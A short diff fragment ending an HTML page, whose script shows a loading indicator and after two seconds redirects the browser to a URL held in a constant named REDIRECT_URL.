+            document.getElementById("finalLoading").classList.add("show");
+
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 2000);
+        });
+    </script>
+
+</body>
+</html>
